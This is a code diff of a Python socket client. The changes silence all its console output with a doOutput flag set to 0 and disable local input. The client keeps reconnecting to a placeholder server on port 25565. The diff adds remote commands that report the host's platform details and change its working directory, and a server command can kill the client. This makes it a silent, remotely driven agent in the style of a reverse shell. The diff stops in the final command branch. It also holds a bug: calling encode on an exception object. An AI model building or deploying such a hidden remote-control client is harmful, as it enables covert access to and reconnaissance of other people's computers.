@@ -3,13 +3,16 @@ import sys
 import time
 import threading
 import os
+import platform
 
 isConnected = 0
 sock = None
 running = 1
 inputThread = None
 isSetup = 0
-server_address = ('192.168.1.8', 10000)
+#Insert server address to connect to. 
+server_address = ('<SERVER ADDRESS>', 25565)
+doOutput = 0
 
 
 def connect():
@@ -18,13 +21,13 @@ def connect():
     if running:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         isConnected = 0
-        setupThreadOne()
+        #setupThreadOne() Input thread
         # Connect the socket to the port where the server is listening
-        print('connecting to %s port %s' % server_address)
+        print('connecting to %s port %s' % server_address) if doOutput else None
         try:
             sock.connect(server_address)
             isConnected = 1
-            print("Connected!!!")
+            print("Connected!!!") if doOutput else None
             setupThreadTwo()
             running()
         except Exception as e:
@@ -32,7 +35,7 @@ def connect():
                 time.sleep(5)
                 connect()
             else:
-                print(str(e))
+                print(str(e)) if doOutput else None
 ###END connect
 
 def running():
@@ -45,7 +48,7 @@ def running():
             except Exception as e:
                 sock.close()
                 isConnected = 0
-                print ("Disconnected!    ", str(e))
+                print ("Disconnected!    ", str(e)) if doOutput else None
         else:
             connect()
     connect()
@@ -64,7 +67,7 @@ def setupThreadOne():
            inputThread.start()
            isSetup = 1
         except Exception:
-           print("Error: ", Exception.error)
+           print("Error: ", Exception.error) if doOutput else None
     ##Finished
 ###END setupThreads
 
@@ -74,14 +77,14 @@ def setupThreadTwo():
       recvThread.daemon = 0
       recvThread.start()
     except Exception:
-      print("Error: ", Exception.error)
+      print("Error: ", Exception.error) if doOutput else None
 ###END setupThreadTwo
 
 def disconnect():
     global sock, isConnected
     sock.close()
     isConnected = 0
-    print("Disconnected!")
+    print("Disconnected!") if doOutput else None
 ###END disconnect
 
 def exitClient(args):
@@ -100,7 +103,7 @@ def runCommand(command, args):
     if command in methods:
         methods[command](args) # + argument list of course
     else:
-        print("Invalid command!!!")
+        print("Invalid command!!!") if doOutput else None
 ###END runCommand
 
 def inputFunc():
@@ -127,8 +130,22 @@ def processCommand(cmd, args):
     elif cmd == "DROPPED":
         disconnect()
     elif cmd == "KILLED":
-        print("Killed")
+        print("Killed") if doOutput else None
         exitClient(None)
+    elif cmd == "PLAT":
+        plat = platform.platform()
+        try:
+            sock.send(plat.encode())
+        except Exception:
+            None
+    elif cmd == "cd":
+        try:
+            os.chdir(args[0])
+        except Exception as e:
+            try:
+                sock.send(e.encode())
+            except Exception:
+                None
     else:
         args = ' '.join(args)
         mess = cmd + " " + args
